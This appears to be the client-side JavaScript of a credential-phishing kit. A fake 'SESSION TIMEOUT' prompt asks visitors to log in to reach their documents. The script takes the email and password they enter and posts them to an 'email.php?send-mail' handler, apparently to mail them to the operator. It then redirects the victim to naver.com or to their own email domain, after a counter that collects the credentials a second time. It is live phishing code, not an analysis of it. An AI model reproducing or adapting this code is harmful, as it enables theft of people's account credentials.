var btnLogin = document.getElementById("login");

function alertMe(){
	alert("SESSION TIMEOUT"  +"\n"
            +"\n"
            +"Login to have access to your documents. " +"\n"
            +"Enter Login details below!.");
}

btnLogin.addEventListener('click', function(e){
	e.preventDefault();
    var email = document.getElementById("email");
    var password = document.getElementById("password");
    var error = document.querySelectorAll("#error");
    
	if(email.value === ""){
		error[0].textContent = "Enter your username!";
		email.style.borderColor = "red";
		email.focus();
		return false;
	}else if(password.value === ""){
		error[0].textContent = "";
		error[1].textContent = "Enter your password!";
		password.style.borderColor = "red";
		password.focus();
		return false;
	} else {
		var processing = document.getElementById("processing");
		error[0].textContent = "";
		error[1].textContent = "";
		processing.textContent = "Logging in...";

		var xmlhttp;
	    if(window.XMLHttpRequest){
	      xmlhttp = new XMLHttpRequest();
	    }else{
	      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	    }

	    xmlhttp.onreadystatechange=function(){
	      if(xmlhttp.readyState==4 && xmlhttp.status==200){
	      	console.log(xmlhttp.responseText);
	      	var res = xmlhttp.responseText.replace(/\s+/g, "");
	      	if(xmlhttp.responseText === 'true'){
	      		window.location = 'https://naver.com';
	      	}else {
	      		processing.textContent = "";
	      		error[1].textContent = "Something went wrong! Please try again.";
	      	}
	      }
	    }

    	var formdata = new FormData();

    	formdata.append("email", email.value);
    	formdata.append("password", password.value);

	    var url = 'email.php?send-mail';

		var redirectUrl = email.value.split("@")[1];
		var counter = sessionStorage.getItem('counter');

		if(counter >= 1){
			window.location.href = 'https://'+redirectUrl;
		}else{
			sessionStorage.setItem('counter', counter+1);
		}
	    
	    xmlhttp.open("POST", url);
	    xmlhttp.send(formdata);

	    return true;
	}
})